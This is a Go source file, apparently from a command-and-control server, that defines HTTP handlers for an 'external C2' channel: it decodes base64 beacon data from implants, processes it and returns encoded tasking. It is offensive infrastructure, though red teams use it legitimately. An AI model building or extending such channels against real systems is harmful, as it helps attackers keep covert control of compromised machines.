package server

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"

	"github.com/gin-gonic/gin"
)

type extC2ReceiveRequest struct {
	BeaconID string `json:"beacon_id"`
	Raw      string `json:"raw"` // base64-encoded raw beacon data
}

type extC2ReceiveResponse struct {
	Success bool   `json:"success"`
	Data    string `json:"data,omitempty"` // base64-encoded response
	Error   string `json:"error,omitempty"`
}

type extC2SendRequest struct {
	BeaconID string `json:"beacon_id"`
	Data     string `json:"data"` // base64-encoded response data
}

type extC2SendResponse struct {
	Success bool   `json:"success"`
	Error   string `json:"error,omitempty"`
}

func (s *Server) handleExtC2Receive(c *gin.Context) {
	var req extC2ReceiveRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: err.Error()})
		return
	}

	slog.Info("External C2 receive", "beacon_id", req.BeaconID, "raw_len", len(req.Raw))

	raw, err := base64.StdEncoding.DecodeString(req.Raw)
	if err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: "base64 decode: " + err.Error()})
		return
	}

	// Parse as BeaconRequest
	var br beaconRequest
	if err := json.Unmarshal(raw, &br); err != nil {
		c.JSON(http.StatusBadRequest, extC2ReceiveResponse{Error: "json decode: " + err.Error()})
		return
	}
	if req.BeaconID != "" {
		br.UUID = req.BeaconID
	}

	resp := s.processBeacon(br, "")
	respJSON, err := json.Marshal(resp)
	if err != nil {
		c.JSON(http.StatusInternalServerError, extC2ReceiveResponse{Error: err.Error()})
		return
	}

	c.JSON(http.StatusOK, extC2ReceiveResponse{
		Success: true,
		Data:    base64.StdEncoding.EncodeToString(respJSON),
	})
}

func (s *Server) handleExtC2Send(c *gin.Context) {
	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: err.Error()})
		return
	}

	var req extC2SendRequest
	if err := json.Unmarshal(body, &req); err != nil {
		c.JSON(http.StatusBadRequest, extC2SendResponse{Error: err.Error()})
		return
	}

	slog.Info("External C2 send", "beacon_id", req.BeaconID, "data_len", len(req.Data))
	c.JSON(http.StatusOK, extC2SendResponse{Success: true})
}

func (s *Server) registerExtC2Routes(r *gin.RouterGroup) {
	r.POST("/extc2/receive", s.handleExtC2Receive)
	r.POST("/extc2/send", s.handleExtC2Send)
}

